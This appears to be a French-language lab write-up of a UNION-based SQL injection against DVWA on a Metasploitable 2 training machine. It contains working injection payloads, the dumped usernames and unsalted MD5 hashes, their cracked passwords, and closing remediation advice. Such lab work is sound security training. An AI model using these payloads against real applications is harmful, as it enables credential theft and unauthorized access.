DVWA — injection SQL

Paramètre inséré sans échappement dans la requête → UNION et dump des identifiants

Service / PortDVWA (application web) — port 80, /dvwa/vulnerabilities/sqli/
CibleMetasploitable 2 — 192.168.56.101
ClasseInjection SQL (OWASP — SQL Injection), UNION-based
RésultatDump de la table users + empreintes MD5 des mots de passe
Testé parZANNOU Josaphat

1. Identification

La page SQL Injection de DVWA insère le paramètre id directement dans une requête SQL (SELECT first_name, last_name FROM users WHERE user_id = '$id') sans échappement au niveau de sécurité low. On peut donc modifier la logique de la requête. Faille distincte de l'injection de commande DVWA (page Command Execution).

2. Confirmation de l'injection (booléenne)

Dans le champ User ID, on saisit 1' OR '1'='1 : la condition devient toujours vraie, donc tous les enregistrements sont renvoyés au lieu du seul id=1.

User ID : 1' OR '1'='1

First name: admin    Surname: admin
First name: Gordon   Surname: Brown
First name: Hack     Surname: Me
First name: Pablo    Surname: Picasso
First name: Bob      Surname: Smith

3. Démarche d'exploitation — UNION et dump des identifiants

La requête renvoie deux colonnes (prénom / nom). On greffe un UNION SELECT pour exfiltrer les colonnes user et password de la table users ; le # commente la fin de la requête d'origine :

User ID : 1' UNION SELECT user, password FROM users #

First name: admin     Surname: admin
First name: admin     Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb   Surname: e99a18c428cb38d5f260853678922e03
First name: 1337      Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo     Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy    Surname: 5f4dcc3b5aa765d61d8327deb882cf99
L'UNION fait apparaître le champ password : les empreintes MD5 (non salées) des comptes DVWA sont extraites via l'injection.

4. Preuve / exploitation des hash

Les empreintes sont des MD5 non salés, cassables instantanément :

admin5f4dcc3b5aa765d61d8327deb882cf99 → password
gordonbe99a18c428cb38d5f260853678922e03 → abc123
13378d3533d75ae2c3966d7e0d4fcc69216b → charley
pablo0d107d09f5bbe40cade3de5c71e9e9b7 → letmein
smithy5f4dcc3b5aa765d61d8327deb882cf99 → password

(admin → 5f4dcc3b... est le MD5 littéral de « password », vérifiable par echo -n password | md5sum.) L'injection permet donc la récupération et le cassage de tous les comptes applicatifs.

5. Remédiation

RECOMMANDATIONS
  • Utiliser des requêtes préparées / paramétrées au lieu de concaténer l'entrée dans la requête SQL.
  • Valider strictement le paramètre id (entier attendu) et appliquer le moindre privilège au compte base de données de l'application.
  • Stocker les mots de passe avec un algorithme lent et salé (bcrypt, argon2), jamais en MD5 nu.
